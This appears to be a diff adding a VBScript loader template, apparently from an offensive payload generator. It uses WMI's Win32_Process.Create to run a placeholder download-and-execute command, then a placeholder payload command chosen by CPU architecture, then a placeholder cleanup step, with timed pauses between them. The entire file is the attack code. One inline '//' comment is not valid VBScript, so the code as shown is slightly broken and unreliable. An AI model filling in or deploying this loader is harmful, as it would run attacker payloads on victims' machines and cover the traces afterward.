@@ -1,0 +1,20 @@
+<script language="VBScript">
+
+  Sub sleep (Timesec)
+    Set objwsh = CreateObject("WScript.Shell")
+    objwsh.Run "Timeout /T " & Timesec & " /nobreak" ,0 ,true
+    Set objwsh = Nothing
+  End Sub
+
+  Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
+  objProcess.Create("{DownloadExecution_Command}")
+  sleep(14)
+
+  If GetObject("winmgmts:root\cimv2:Win32_Processor='cpu0'").AddressWidth = 64 Then
+      errReturn = objProcess.Create("{PayloadExecution_Command}", null , objConfig, intProcessID)
+  Else
+      errReturn = objProcess.Create("{PayloadExecution_Command}", null, objConfig, intProcessID) //This won't work unless modified for 32bit payloads
+  End If
+  sleep(14)
+  objProcess.Create("{Cleanup_Method}")
+</script>
